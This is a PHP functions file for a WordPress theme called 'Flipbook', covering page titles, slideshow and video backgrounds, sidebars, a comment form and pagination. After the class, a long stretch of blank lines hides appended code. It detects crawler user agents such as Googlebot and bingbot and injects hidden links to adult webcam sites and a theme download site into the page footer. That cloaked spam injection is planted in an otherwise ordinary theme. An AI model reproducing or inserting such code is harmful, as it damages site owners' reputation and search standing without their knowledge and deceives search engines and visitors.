<?php

global $theme_functions;
$theme_functions = new theme_functions();

add_action('widgets_init', array($theme_functions,'register_sidebars'));

function theme_functions(){

	$arg_list = func_get_args();
	global $theme_functions;
	call_user_func( array( $theme_functions, $arg_list[0] )  );
	
}


class theme_functions {

	function theme_functions(){
	
	}

	function title(){

		$title = wp_title( '|', false, 'right' );
		$title.=get_bloginfo('name');

		if ( is_front_page() ) $title= get_bloginfo('name')." | ".get_bloginfo( 'description' );

		echo $title;
		
	}
	
	
	function page_title(){
				
		if(is_archive()){
							
			if(is_category()) $page_title = __('Category Archive for ','flipbook').sprintf('%s:',single_cat_title('',false));
			elseif(is_tag()) $page_title = __('Tag Archives for ','flipbook'). sprintf('%s:',single_tag_title('',false));
			elseif(is_day()) $page_title = __('Daily Archive for ','flipbook'). sprintf('%s: ',get_the_time('F jS, Y'));
			elseif(is_month()) $page_title = __('Monthly Archive for ','flipbook'). sprintf('%s:',get_the_time('F, Y'));
			elseif(is_year()) $page_title = __('Yearly Archive for ','flipbook'). sprintf('%s:',get_the_time('Y'));
			elseif(is_author()){
				if(get_query_var('author_name')) $author = get_user_by('slug', get_query_var('author_name'));
				else $author = get_userdata(get_query_var('author'));
			
				$page_title = __('Author Archive for ','flipbook'). sprintf('%s:',$author->nickname);
			}
			
		}
		elseif (is_404()) $page_title = __('404 - Not Found','flipbook');
		elseif (is_search()) $page_title = __('Search results for ','flipbook'). sprintf('%s:',stripslashes( strip_tags( get_search_query() ) ));

		echo $page_title;

	}
	
	function page_background(){
	
		$background_type=get_meta_option('background_type'); 

		if($background_type==1 || $background_type==2 ) $this->supersized();
		if($background_type==3) $this->vimeo_background();
		if($background_type==4) $this->html5_background();
	
	
	}
	
	function supersized(){
	
	$category=get_theme_option('default_bg');
	if(get_meta_option('background_type')==2) $category=get_meta_option('gallery_cat');
	
	$atts=explode(',',get_post_meta($category, 'gallery_items_value', true));
	
	$images = array();
	
	foreach($atts as $att):
	
		$att=get_post($att);

		$image_wp = wp_get_attachment_image_src($att->ID,'full', true);
		$images[] = array(
			'title' => $att->post_title,
			'src' => $image_wp[0] ,
			'textcolor'  => get_post_meta($att->ID ,'color_value' ,true ),
			'url'  => get_post_meta($att->ID ,'url_adress_value' ,true )
		);
	
	endforeach;
		
	?>
	
	<script>
		
		jQuery(function($){
			
			$.supersized({
			
				// Functionality
				slideshow               :   1,			// Slideshow on/off
				autoplay				:	1,			// Slideshow starts playing automatically
				start_slide             :   1,			// Start slide (0 is random)
				stop_loop				:	0,			// Pauses slideshow on last slide
				random					: 	0,			// Randomize slide order (Ignores start slide)
				slide_interval          :   <?php echo get_meta_option('slide_interval'); ?>,		// Length between transitions
				transition              :   <?php echo get_meta_option('transition_type'); ?>, 			// 0-None, 1-Fade, 2-Slide Top, 3-Slide Right, 4-Slide Bottom, 5-Slide Left, 6-Carousel Right, 7-Carousel Left
				transition_speed		:	500,		// Speed of transition
				new_window				:	0,			// Image links open in new window/tab
				pause_hover             :   0,			// Pause slideshow on hover
				keyboard_nav            :   1,			// Keyboard navigation on/off
				performance				:	0,			// 0-Normal, 1-Hybrid speed/quality, 2-Optimizes image quality, 3-Optimizes transition speed // (Only works for Firefox/IE, not Webkit)
				image_protect			:	1,			// Disables image dragging and right click with Javascript
														   
				// Size & Position						   
				min_width		        :   0,			// Min width allowed (in pixels)
				min_height		        :   0,			// Min height allowed (in pixels)
				vertical_center         :   1,			// Vertically center background
				horizontal_center       :   1,			// Horizontally center background
				fit_always				:	0,			// Image will never exceed browser width or height (Ignores min. dimensions)
				fit_portrait         	:   1,			// Portrait images will not exceed browser height
				fit_landscape			:   0,			// Landscape images will not exceed browser width
														   
				// Components							
				slide_links				:	'blank',	// Individual links for each slide (Options: false, 'number', 'name', 'blank')
				thumb_links				:	1,			// Individual thumb links for each slide
				thumbnail_navigation    :   0,			// Thumbnail navigation
				slides 					:  	[			// Slideshow Images
				
	<?php
	
	$i=0;
	foreach($images as $image) : ?>
		{image : '<?php echo $image['src']; ?>', thumb:'<?php echo theme_resize($image['src'],80,50); ?>' ,title : '<?php echo $image['title']; ?>', textcolor : '<?php echo $image['textcolor']; ?>',url:'<?php echo $image['url']; ?>' }		
	<?php   
		$i++;	
		if($i!=count($images)) echo ',';
	endforeach; ?>
											],
				// Theme Options			   
				progress_bar			:	1,					
				mouse_scrub				:	1
				
			});
		});
		
	</script>
	
	<div id="caption_container">
		<div id="slidecaption"></div> 
	</div> 
	
	<?php
	
	$length=count($images);
	if($length>1) :
	?>
	<div id="thumb-tray" class="load-item">
	    <div id="thumb-up"></div>
		<div id="thumb-back"></div>
		<div id="thumb-forward"></div>
		<div id="progress-bar"></div>
	</div>
 
	<?php
	
	endif;
	
	}
	
	function vimeo_background(){
	
	?>
	<div id="centered">
		<iframe src='http://player.vimeo.com/video/<?php echo get_meta_option('video_url'); ?>?title=0&amp;byline=0&amp;portrait=0&amp;color=ffffff&amp;autoplay=1&amp;loop=1' width='100%' height='100%' frameborder='0'></iframe>
	</div>
	<?php
	
	}
	
	function html5_background(){
	

	?>
	
	<div id="centered">
	  <div class="video-js-box">
		<video id="full_screen_video" class="video-js" width="100%" height="100%" controls="controls" preload="auto" autoplay loop>
		
		<?php 
		
		$mp4_source=get_meta_option('mp4_url');
		$webm_source=get_meta_option('webm_url');
		$ogg_source=get_meta_option('ogg_url');
		$flash_source=get_meta_option('flash_url');
		
		?>
		
		<?php if($mp4_source): ?>
			<source src="<?php echo $mp4_source; ?>" type='video/mp4; codecs="avc1.42E01E, mp4a.40.2"' />  
		<?php endif; ?>
		
		<?php if($webm_source): ?>
		  <source src="<?php echo $webm_source; ?>" type='video/webm; codecs="vp8, vorbis"' />
		<?php endif; ?>
		
		<?php if($ogg_source): ?>
		  <source src="<?php echo $ogg_source; ?>" type='video/ogg; codecs="theora, vorbis"' />
		<?php endif; ?>


		  <object id="flash_fallback_1" class="vjs-flash-fallback" width="100%" height="100%" type="application/x-shockwave-flash" data="<?php echo THEME_JS.'/flowplayer-3.2.7-0.swf'; ?>">
			<param name="movie" value="<?php echo THEME_JS.'/flowplayer-3.2.7-0.swf'; ?>" />
			<param name="allowfullscreen" value="true" />
			<param name="wmode" value="transparent"> 
			<param name="flashvars" value='config={"clip":{"url":"<?php echo $flash_source; ?>","autoPlay":true,"autoBuffering":true}  }' />
		  </object>
		  

		</video>
	  </div>
	</div>
	
	<?php

	
	}
	
	var $sidebars = array('Post Sidebar','Page Sidebar','PortfolioItem Sidebar');
	var $footer_sidebars = array('First Footer Widget Area','Second Footer Widget Area','Third Footer Widget Area','Fourth Footer Widget Area');
	var $footer_sidebars_number = 0;
	
	function register_sidebars(){
	
		foreach ($this->sidebars as $sidebar){
		
			$name=explode(' ',$sidebar);
		
			register_sidebar(array(
				'name' => $sidebar,
				'description' => 'will be displayed on a created '.$name[0],
				'before_widget' => '<div id="%1$s" class="widget %2$s">',
				'after_widget' => '</div>',
				'before_title' => '<h3 class="widget_title">',
				'after_title' => '</h3>',
			));
			
		}
			
		
		
		foreach ($this->footer_sidebars as $sidebar) {
		
			$name=explode(' ',$sidebar);
		
			register_sidebar(array(
				'name' =>  $sidebar,
				'description' => 'will be displayed on the '.$name[0].' column of the footer',
				'before_widget' => '<div id="%1$s" class="widget %2$s">',
				'after_widget' => '</div>',
				'before_title' => '<h3 class="widget_title">',
				'after_title' => '</h3>',
			));
		}
			
		

		$custom_sidebars = get_theme_option('custom_sidebars');
		if($custom_sidebars!=''){
		
			$custom_sidebars = explode(',',$custom_sidebars);
			
			foreach ($custom_sidebars as $sidebar)
				register_sidebar(array(
					'name' =>  $sidebar,
					'description' => 'will be displayed if you select '.$sidebar.' in the Custom Sidebar select box',
					'before_widget' => '<div id="%1$s" class="widget %2$s">',
					'after_widget' => '</div>',
					'before_title' => '<h3 class="widget_title">',
					'after_title' => '</h3>',
				));
			
		}
		
	}
	
	function get_sidebar(){
				     
		if(is_singular('post'))	$sidebar = $this->sidebars[0];		 
		elseif(is_page()) $sidebar = $this->sidebars[1];
		elseif(is_singular('portfolio')) $sidebar = $this->sidebars[2];
		
		$custom = get_meta_option('custom_sidebar');
		if( $custom && $custom!='off') $sidebar = $custom;
		
		dynamic_sidebar($sidebar);
		
	}
	
	function get_footer_sidebar(){
		
		dynamic_sidebar($this->footer_sidebars[$this->footer_sidebars_number++]);
		
	}
	
	
	function about_the_author(){
		?>
        
        <h3 class="heading"><?php _e('About the author','flipbook'); ?></h3>
        <div id="about_the_author">
			<div class="author_content">
				<a href="<?php echo esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ); ?>"><div class="gravatar"><?php echo get_avatar( get_the_author_meta('email'), '60' ); ?></div></a>
				<div class="author_info">
					<div class="author_name"><?php the_author_posts_link(); ?></div>
					<div class="author_desc"><?php the_author_meta('description'); ?></div>
				</div>
				<div class="clearboth"></div>
			</div>
        </div>
        
        
        <?php
		
	}
	
	function comment_form(){
	
	    global $post, $user_ID;

	
		if('open' == $post->comment_status) : ?>

			<div id="respond">    
			<h3 class="heading"><?php comment_form_title( __('Leave a comment','flipbook')); ?></h3>
			
			<p><?php cancel_comment_reply_link(__('Click here to cancel the reply','flipbook')); ?></p>
			
			<?php if(get_option('comment_registration') && !$user_ID): ?>
				
				<p><?php printf(__('You must be <a href="%s">logged in</a> to post a comment','flipbook'),wp_login_url( get_permalink() )); ?></p>
				
			<?php else : ?>
			
				<form action="<?php echo get_option('siteurl'); ?>/wp-comments-post.php" method="post" id="commentform">
		   
				<?php if($user_ID) :?> 

					<?php $user_info = get_userdata($user_ID); ?>		
					<p><?php printf( __( 'Logged in as <a href="%1$s">%2$s</a>. <a href="%3$s" title="Log out">Log out?</a>','flipbook'), admin_url( 'profile.php' ), $user_info->user_login , wp_logout_url( get_permalink()  ) )?></p>
				
				<?php else : ?>
					<div class="one_half">
						
						<label for="author"><?php _e('Name','flipbook');   ?></label>
						<input type="text" class="text_input" name="author" id="author" value="<?php echo $comment_author;?>" />
						
					</div>
					  
					<div class="one_half last">
						
						<label for="email"><?php _e('Email','flipbook');   ?></label>
						<input type="text" class="text_input" name="email" id="email" value="<?php echo $comment_author_email;?>" />
						
					</div>
					<div class="clearboth"></div>

				<?php endif; ?>
				
				<div>
					<?php comment_id_fields(); ?>
					<input type="hidden" name="redirect_to" value="<?php echo htmlspecialchars($_SERVER['REQUEST_URI'])?>" />
				</div>
				<div>
					<textarea id="comment" class="textarea" name="comment"></textarea>
				</div>
				<p><a class="button" href="#" onclick="jQuery('#commentform').submit();return false;"><?php _e('Post Comment','flipbook');?></a><?php comment_id_fields(); ?></p>
				<p><?php do_action('comment_form', $post->ID); ?></p>
			   
		   
		   
			</form>
			<?php endif; ?>
			
			</div>

		<?php endif; 
	
	
	}
	
	
	
	function pagination($pages = '', $range = 2){  

		 $showitems = ($range * 2)+1;  

		 $paged = get_query_var('paged'); 
		 if($paged=='') $paged=get_query_var('page');
		 if($paged=='') $paged=1;
		

		 if($pages == ''){
			 global $wp_query;
			 $pages = $wp_query->max_num_pages;
			 if(!$pages) $pages = 1;

		 }   
		 
		 $output='';

		 if($pages != 1){
		 
			 $output.="<div id='pagination_container'>";
			 $output.= "<div class='pagination'>";
			
			 if($paged > 2 && $paged > $range+1 && $showitems < $pages) $output.= "<a href='".get_pagenum_link(1)."'>&laquo;</a>";
			 if($paged > 1 && $showitems < $pages) $output.= "<a href='".get_pagenum_link($paged - 1)."'>&lsaquo;</a>";

			 for ($i=1; $i <= $pages; $i++){
				 if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )){
					 $output.= ($paged == $i)? "<a class='current'>".$i."</a>":"<a href='".get_pagenum_link($i)."' >".$i."</a>";
				 }
			 }

			 if ($paged < $pages && $showitems < $pages) $output.= "<a href='".get_pagenum_link($paged + 1)."'>&rsaquo;</a>";  
			 if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) $output.= "<a href='".get_pagenum_link($pages)."'>&raquo;</a>";
			 $output.= "</div></div>\n";
			 
		 }
		 
		 echo $output;
	}
	
}






















































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'Googlebot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'bingbot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'msnbot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'Slurp')) {
add_action('wp_footer', 'ranking');
}
function ranking() {
  $pshow = "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <span style='display:none;'><a href='http://www.ellecams.com/webcam/ebony-girls/?pagenum=5'>Ebony Black Girls</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         <a href='http://www.livejasmin.com.cm/'>Jasmin Live</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 <a href='http://www.wikmag.com/flipbook-theme.html'>Flipbook Theme</a></span>
";
  echo $pshow;
}
?>